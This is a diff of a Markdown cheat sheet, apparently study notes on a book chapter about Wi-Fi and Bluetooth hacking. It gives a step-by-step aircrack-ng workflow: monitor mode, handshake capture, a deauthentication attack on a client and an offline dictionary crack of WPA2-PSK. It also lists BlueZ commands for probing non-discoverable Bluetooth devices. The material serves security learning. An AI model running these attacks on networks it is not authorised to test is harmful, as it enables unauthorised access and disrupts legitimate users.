@@ -2,123 +2,187 @@
 
 ## Table of Contents
 
-* [Introduction](#introduction)
-* [Wi-Fi Fundamentals & Terminology](#wi-fi-fundamentals--terminology)
-* [Basic Wireless Commands](#basic-wireless-commands)
-* [Wi-Fi Reconnaissance & Cracking (Aircrack-ng)](#wi-fi-reconnaissance--cracking-aircrack-ng)
-* [Bluetooth Concepts & Architecture](#bluetooth-concepts--architecture)
-* [Bluetooth Scanning & Service Discovery (BlueZ)](#bluetooth-scanning--service-discovery-bluez)
-* [Key Tips](#key-tips)
-* [Quick Command Chains](#quick-command-chains)
-* [Quick Start](#quick-start)
+- [Introduction](#introduction)
+- [Wi-Fi Fundamentals & Terminology](#wi-fi-fundamentals--terminology)
+- [Basic Wireless Commands & Diagnostics](#basic-wireless-commands--diagnostics)
+- [Wi-Fi Reconnaissance & Cracking (Aircrack-ng)](#wi-fi-reconnaissance--cracking-aircrack-ng)
+- [Bluetooth Concepts & Architecture](#bluetooth-concepts--architecture)
+- [Bluetooth Scanning & Service Discovery (BlueZ)](#bluetooth-scanning--service-discovery-bluez)
+- [Key Tips & Source Text Gotchas](#key-tips--source-text-gotchas)
+- [Quick Command Chains](#quick-command-chains)
+- [Quick Start](#quick-start)
 
 ---
 
 ## Introduction
 
-Wireless networks operating on IEEE 802.11 (Wi-Fi) and Bluetooth standards transmit data over open RF channels. Inspecting wireless environments involves discovering access points (APs), identifying client associations, switching interfaces to monitor mode, capturing handshake data, and enumerating Bluetooth services.
+Wireless networks operating on IEEE 802.11 (Wi-Fi) and Bluetooth standards transmit radio frequency (RF) signals across open airspaces. Inspecting these wireless environments requires discovering Access Points (APs), analyzing client associations, switching adapters into monitor mode, intercepting password hashes via 4-way handshakes, and enumerating Bluetooth stacks using BlueZ utilities.
 
 ---
 
 ## Wi-Fi Fundamentals & Terminology
 
-| Term / Parameter | Definition & Specification |
+| Parameter / Term | Technical Definition & Operational Parameters |
 | --- | --- |
-| **AP (Access Point)** | Device facilitating network access for wireless clients. |
-| **SSID (Service Set Identifier)** | Public human-readable name of the wireless network. |
-| **ESSID (Extended SSID)** | Network identifier applied across multiple APs in a single wireless LAN. |
-| **BSSID (Basic SSID)** | Unique hardware identifier for an AP (matches device MAC address). |
-| **Channels** | Operates on channels 1–14 globally; legally restricted to **channels 1–11 in the US**. |
-| **Frequency** | Operates on **2.4 GHz** and **5 GHz** spectrum bands. |
-| **Power & Range** | Legal US limit is **0.5 Watts** (~300 ft / 100 m range); high-gain antennas extend range up to 20 miles. |
-| **Security Protocols** | **WEP** (Flawed/Cracked) $\rightarrow$ **WPA** (Legacy) $\rightarrow$ **WPA2-PSK** (Pre-Shared Key standard). |
-| **Operational Modes** | **Managed** (Client Mode) | **Master** (Access Point Mode) | **Monitor** (Promiscuous RF Sniffing). |
+| **AP (Access Point)** | Intermediary infrastructure device connecting wireless clients to a wired network. |
+| **SSID (Service Set Identifier)** | Public human-readable name assigned to a wireless network. |
+| **ESSID (Extended SSID)** | Identifier spanning multiple APs across an extended wireless Local Area Network (LAN). |
+| **BSSID (Basic SSID)** | Unique 48-bit hardware identifier of an AP, matching its physical MAC address. |
+| **Channels** | Operates on channels 1–14 globally; legally restricted to **channels 1–11 in the United States**. |
+| **Frequency** | Spectrum bands operating primarily at **2.4 GHz** and **5 GHz**. |
+| **Power & Range** | Legal US broadcast power is capped at **0.5 Watts** (~300 ft / 100 m range); high-gain antennas extend range up to 20 miles. Signal strength increases proximity to the AP, making exploitation easier. |
+| **Security Protocols** | **WEP** (Wired Equivalent Privacy - deeply flawed/easily broken) $\rightarrow$ **WPA** (Wi-Fi Protected Access - legacy) $\rightarrow$ **WPA2-PSK** (Pre-Shared Key standard using a shared password; used by nearly all consumer APs except enterprise Wi-Fi). |
+| **Operational Modes** | **Managed** (Client mode joining APs) | **Master** (Act as an AP) | **Monitor** (Promiscuous RF packet sniffing). |
 
 ---
 
-## Basic Wireless Commands
+## Basic Wireless Commands & Diagnostics
 
-### Interface Inspection and Scanning
+### 1. Interface Identification (`ifconfig`)
 
 ```bash
-# Display activated network interfaces (wireless designated as wlan0, wlan1, etc.)
+# Display activated interfaces (Wireless interfaces designated as wlan0, wlan1, etc.)
 ifconfig
 
-# Display wireless-specific parameters (Mode, ESSID, Access Point MAC, Tx-Power, Frequency)
+```
+
+### 2. Wireless Interface Status (`iwconfig`)
+
+Inspects wireless-specific parameters, operational status, and signal metrics:
+
+```bash
 iwconfig
 
-# Perform an active scan for nearby wireless access points
+```
+
+* **Key Parameter Outputs:**
+* **IEEE Standard:** e.g., `IEEE 802.11bg`
+* **ESSID:** `off/any` (Unconnected) or `"Hackers-Arise"` (Connected)
+* **Mode:** `Managed`, `Master`, or `Monitor`
+* **Access Point:** `Not-Associated` or target MAC address (e.g., `00:25:9C:97:4F:48`)
+* **Tx-Power:** Transmit power (e.g., `20 dBm`)
+* **Quality / Signal Level:** e.g., `Link Quality=64/70`, `Signal level=-46 dBm`
+* **Thresholds & Limits:** `Retry short limit`, `RTS thr`, `Fragment thr`, `Power Management`
+
+
+
+### 3. Access Point Scanning (`iwlist`)
+
+Scans for broadcasting wireless access points within physical range (300–500 feet default):
+
+```bash
 iwlist wlan0 scan
 
 ```
 
-### NetworkManager CLI (`nmcli`) Controls
+* **Extracted Data:** Cell Number, BSSID (MAC Address), Channel, Frequency (e.g., `2.412GHz`), Link Quality, Signal Level (`-38 dBm`), Encryption Status (`Encryption key:off` or `on`), and ESSID.
+
+### 4. NetworkManager CLI (`nmcli`)
+
+Command-line interface to the high-level `NetworkManager` daemon.
 
 ```bash
-# List nearby wireless networks with SSID, Mode, Channel, Bitrate, Signal, and Security
+# Scan nearby Wi-Fi APs and display SSID, Mode, Channel, Rate, Signal, Bars, and Security
 nmcli dev wifi
 
-# Authenticate and connect to a Wi-Fi Access Point
-nmcli dev wifi connect <AP-SSID> password <APpassword>
+# Connect to a WPA1/WPA2 password-protected network
+nmcli dev wifi connect Hackers-Arise password 12345678
 
 ```
+
+> **Activation Output:** Successfully activating a device returns a system Device UUID (e.g., `Device 'wlan0' successfully activated with '394a5bf4-8af4-36f8-49beda6cb530'`).
 
 ---
 
 ## Wi-Fi Reconnaissance & Cracking (Aircrack-ng)
 
-Cracking WPA2-PSK networks requires capturing the four-way handshake exchanged between a legitimate client and the target AP.
+Cracking WPA2-PSK requires three target variables: **Target BSSID (AP MAC)**, **Client MAC**, and **Channel Number**.
 
-### Enabling Monitor Mode (`airmon-ng`)
+```
+                         [Wi-Fi Cracking Workflow]
+                                     │
+                    1. airmon-ng start wlan0 (Monitor Mode)
+                                     │
+                    2. airodump-ng wlan0mon (Find Target)
+                                     │
+                    3. Target Channel Capture (Terminal 1)
+                                     │
+                    4. Deauth Client Attack (Terminal 2)
+                                     │
+                    5. WPA2 Handshake Hash Captured
+                                     │
+                    6. Dictionary Attack (Terminal 3)
+
+```
+
+### Step 1: Enable Monitor Mode (`airmon-ng`)
+
+Puts the wireless card into promiscuous mode to capture all RF traffic.
 
 ```bash
-# Terminate interfering background processes (if needed)
+# Terminate interfering processes (if tools fail after short periods)
 airmon-ng check kill
 
-# Enable monitor mode on interface (renames interface to wlan0mon)
+# Enable monitor mode on interface (Renames wlan0 to wlan0mon)
 airmon-ng start wlan0
 
-# Disable monitor mode
+# Stop monitor mode
 airmon-ng stop wlan0mon
 
 ```
 
-### Capturing Wireless Traffic (`airodump-ng`)
+### Step 2: Broad Spectrum Traffic Capture (`airodump-ng`)
 
 ```bash
-# Monitor all nearby AP broadcasts and connected clients
 airodump-ng wlan0mon
 
 ```
 
-* **Captured AP Data:** BSSID, Signal Power (`PWR`), Beacon frames, Data throughput (`#Data`), Channel (`CH`), Encryption (`ENC`), Cipher (`CIPHER`), Authentication (`AUTH`), ESSID.
-* **Captured Client Data:** Client BSSID, Station MAC, Signal Power, Rate, Lost packets, Frames, Probed SSIDs.
+#### Screen Split Layout Breakdown
 
-### WPA2 Handshake Attack (3-Terminal Sequence)
+* **Upper Section (Broadcasting APs):**
+* `BSSID`: MAC address of AP
+* `PWR`: Signal strength
+* `Beacons`: Announcement frames sent by AP
+* `#Data` / `#/s`: Captured data packets / Throughput rate
+* `CH`: Operating channel (1–14)
+* `MB`: Speed limit (e.g., `54e`)
+* `ENC` / `CIPHER` / `AUTH`: Encryption (`WPA2`), Cipher (`CCMP`), Authentication (`PSK`)
+* `ESSID`: Network name
 
-#### Terminal 1: Capture Target Channel & BSSID Traffic
+
+* **Lower Section (Client Devices):**
+* `BSSID`: AP MAC the client is associated with (or `(not associated)`)
+* `Station`: Physical MAC address of the client device
+* `Rate` / `Lost` / `Frames` / `Probe`: Transmission metrics and searched SSIDs
+
+
+
+### Step 3: WPA2-PSK Handshake Attack (3-Terminal Sequence)
+
+#### Terminal 1: Capture Target AP Packets
 
 ```bash
-airodump-ng -c <channel> --bssid <target_AP_MAC> -w <output_prefix> wlan0mon
-# Example: airodump-ng -c 10 --bssid 01:01:AA:BB:CC:22 -w Hackers-ArisePSK wlan0mon
+# Capture packets on channel 10 for target BSSID and output to file prefix
+airodump-ng -c 10 --bssid 01:01:AA:BB:CC:22 -w Hackers-ArisePSK wlan0mon
 
 ```
 
-#### Terminal 2: Deauthenticate Client to Force Re-authentication
+#### Terminal 2: Inject Deauthentication Frames
 
 ```bash
-aireplay-ng --deauth <packet_count> -a <target_AP_MAC> -c <target_client_MAC> wlan0mon
-# Example: aireplay-ng --deauth 100 -a 01:01:AA:BB:CC:22 -c A0:A3:E2:44:7C:E5 wlan0mon
+# Send 100 deauth frames to disconnect client and force a 4-way re-authentication handshake
+aireplay-ng --deauth 100 -a 01:01:AA:BB:CC:22 -c A0:A3:E2:44:7C:E5 wlan0mon
 
 ```
 
-> **Result:** Captures the WPA2 4-way password hash, displayed in the upper-right corner of Terminal 1.
+*(Once client reconnects, `WPA handshake: 01:01:AA:BB:CC:22` appears in the top-right of Terminal 1).*
 
-#### Terminal 3: Dictionary Attack on Captured Handshake
+#### Terminal 3: Offline Dictionary Crack
 
 ```bash
-aircrack-ng -w <wordlist> -b <target_AP_MAC> <capture_file.cap>
-# Example: aircrack-ng -w wordlist.dic -b 01:01:AA:BB:CC:22 Hackers-ArisePSK.cap
+# Crack the captured password hash using a wordlist
+aircrack-ng -w wordlist.dic -b 01:01:AA:BB:CC:22 Hackers-ArisePSK.cap
 
 ```
 
@@ -126,78 +190,103 @@ aircrack-ng -w <wordlist> -b <target_AP_MAC> <capture_file.cap>
 
 ## Bluetooth Concepts & Architecture
 
-* **Protocol & Spectrum:** Operates on **2.4–2.485 GHz** using frequency hopping spread spectrum (**1,600 hops/sec**).
-* **History:** Developed in 1994 by Ericsson Corp.; named after King Harald Bluetooth.
-* **Range:** Minimum 10 meters; typical range up to 100 meters (extensible with specialized directional antennas).
-* **Pairing & Discoverable Mode:** Transmits device **Name**, **Class**, **List of Services**, and **Technical Info**. Pairing exchanges a persistent **Link Key**.
-* **Addressing:** Uses a unique **48-bit hardware identifier** (MAC-style address).
+* **Protocol & Spectrum:** Low-power, short-range RF standard operating at **2.4–2.485 GHz**.
+* **Security Mechanism:** Uses Frequency Hopping Spread Spectrum (FHSS) at **1,600 hops per second**.
+* **History:** Developed in 1994 by Ericsson Corp. (Sweden); named after 10th-century Danish King Harald Bluetooth.
+* **Operating Range:** Minimum 10 meters; manufacturer implementations reach 100+ meters (further with directional antennas).
+* **Pairing Process:** Devices pair when in **Discoverable Mode**, broadcasting:
+1. Device Name
+2. Device Class
+3. List of Services
+4. Technical Information
+
+
+* **Authentication:** Pairing generates and stores a shared **Link Key** for future connections.
+* **Addressing:** Identified by a unique **48-bit hardware address** (BD Address).
 
 ---
 
 ## Bluetooth Scanning & Service Discovery (BlueZ)
 
-The **BlueZ** protocol stack provides CLI utilities for managing Bluetooth devices in Linux.
+Linux uses the **BlueZ** protocol stack to manage Bluetooth devices.
 
 ```bash
-# Install BlueZ suite (if not pre-installed)
+# Install BlueZ suite (if missing)
 apt-get install bluez
 
 ```
 
-### BlueZ Utility Breakdown
+### BlueZ Toolset Summary
 
-| Tool | Primary Operational Purpose |
+| Utility | Primary Purpose |
 | --- | --- |
-| `hciconfig` | Configures local Bluetooth adapters (similar to `ifconfig`). |
-| `hcitool` | Scans and inquires remote Bluetooth devices for identifiers and clocks. |
-| `sdptool` | Queries Service Discovery Protocol (SDP) records on target devices. |
-| `hcidump` | Sniffs and extracts data packets transmitted over Bluetooth connections. |
-| `l2ping` | Sends L2CAP pings to target MAC addresses to verify reachability. |
+| `hciconfig` | Configures and queries local Bluetooth host adapters (similar to `ifconfig`). |
+| `hcitool` | Scans, inquires, and extracts device IDs, names, classes, and clock offsets. |
+| `sdptool` | Queries Service Discovery Protocol (SDP) records to list target capabilities. |
+| `l2ping` | Sends L2CAP pings to test physical reachability of target MAC addresses. |
+| `hcidump` | Sniffs and parses raw Bluetooth HCI data packets over the air. |
 
-### Command Execution Sequence
+### Execution Workflow
 
 ```bash
-# Step 1: Verify local Bluetooth adapter state
+# 1. Inspect local Bluetooth adapter state
 hciconfig
 
-# Step 2: Bring local HCI interface online
+# 2. Enable local HCI adapter (hci0)
 hciconfig hci0 up
 
-# Step 3: Scan for discoverable Bluetooth devices (Returns MAC and Name)
+# 3. Scan for discoverable Bluetooth devices (Returns MAC and Name)
 hcitool scan
 
-# Step 4: Perform low-level inquiry (Returns MAC, Clock Offset, Device Class)
+# 4. Perform low-level inquiry (Returns MAC, Clock Offset, and Hex Device Class)
 hcitool inq
 
-# Step 5: Enumerate SDP services (Works even if device is NOT in discovery mode)
-sdptool browse <target_MAC>
+```
 
-# Step 6: Test connection reachability via L2CAP ping
-l2ping <target_MAC> -c <packet_count>
+* **Class Code Lookup:** Hex class output (e.g., `class:0x5a020c`) indicates device type. Decode using the [Bluetooth SIG Service Discovery Page](https://www.google.com/search?q=https://www.bluetooth.org/en-us/specification/assigned-numbers/service-discovery/).
+
+```bash
+# 5. Enumerate SDP services (Works even if target is NOT in discoverable mode)
+sdptool browse 76:6E:46:63:72:66
+
+```
+
+* **Service Signals:** Identifies protocols such as `L2CAP` (Logical Link Control & Adaptation Protocol) and `ATT` (Low Energy Attribute Protocol used in IoT/BLE devices).
+
+```bash
+# 6. Test connection reachability via L2CAP ping (Works regardless of discoverable status)
+l2ping 76:6E:46:63:72:66 -c 3
+
+# 7. Sniff Bluetooth communications
+hcidump
 
 ```
 
 ---
 
-## Key Tips
+## Key Tips & Source Text Gotchas
 
-* **Promiscuous Sniffing** — A wireless card must be in **Monitor Mode** (`airmon-ng`) to capture raw 802.11 frames not addressed to your specific MAC address.
-* **SDP Discovery Bypass** — Target Bluetooth devices do **not** need to be in discoverable mode for `sdptool browse` or `l2ping` to probe them if their MAC address is known.
-* **Target Parameters Required for Cracking** — Successful WPA2 cracking requires three primary variables: Target BSSID (AP MAC), Client Station MAC, and Channel Number.
+* **Source Text Filename Typo** — In the book's Chapter 14 cracking section, the capture file is created as `Hackers-ArisePSK` in Terminal 1, but referenced as `Hacker-ArisePSK.cap` (missing the 's') in Terminal 3. Ensure your file parameters match your output name (`<prefix>-01.cap`).
+* **Non-Discoverable Target Probe** — Target Bluetooth devices do **not** need to be in discoverable mode to run `sdptool browse` or `l2ping` as long as you know their 48-bit MAC address.
+* **Interface Renaming** — Executing `airmon-ng start wlan0` renames the interface to `wlan0mon`. Always use `wlan0mon` for subsequent `airodump-ng` and `aireplay-ng` commands.
+* **Enterprise Exception** — Enterprise Wi-Fi uses 802.1X authentication servers rather than WPA2-PSK pre-shared keys.
 
 ---
 
 ## Quick Command Chains
 
 ```bash
-# Full Wi-Fi Monitor Activation Sequence
+# Full Wi-Fi Monitor Mode Setup
 airmon-ng check kill && airmon-ng start wlan0
 
-# Bluetooth Reconnaissance Chain
+# WPA2 Handshake Capture Command
+airodump-ng -c 10 --bssid 01:01:AA:BB:CC:22 -w Hackers-ArisePSK wlan0mon
+
+# Bluetooth Full Recon Loop
 hciconfig hci0 up && hcitool scan && hcitool inq
 
-# Target Bluetooth Service Audit & Ping Test
-sdptool browse 76:6E:46:63:72:66 && l2ping 76:6E:46:63:72:66 -c 3
+# Probe Target Device Services and Distance
+sdptool browse <TARGET_MAC> && l2ping <TARGET_MAC> -c 3
 
 ```
 
@@ -205,4 +294,4 @@ sdptool browse 76:6E:46:63:72:66 && l2ping 76:6E:46:63:72:66 -c 3
 
 ## Quick Start
 
-Check Interface (`iwconfig` / `hciconfig`) $\rightarrow$ Enable Monitor/HCI (`airmon-ng start` / `hciconfig hci0 up`) $\rightarrow$ Perform Recon (`airodump-ng` / `hcitool scan`) $\rightarrow$ Capture Handshake / Enumerate SDP (`aireplay-ng` / `sdptool browse`) $\rightarrow$ Execute Exploit (`aircrack-ng`)
+Check Interfaces (`iwconfig` / `hciconfig`) $\rightarrow$ Bring Adapter Up / Monitor (`airmon-ng start wlan0` / `hciconfig hci0 up`) $\rightarrow$ Run Recon Scan (`airodump-ng wlan0mon` / `hcitool scan`) $\rightarrow$ Capture Handshake / Enumerate SDP (`aireplay-ng` + `airodump-ng` / `sdptool browse`) $\rightarrow$ Execute Attack (`aircrack-ng` / `l2ping`)
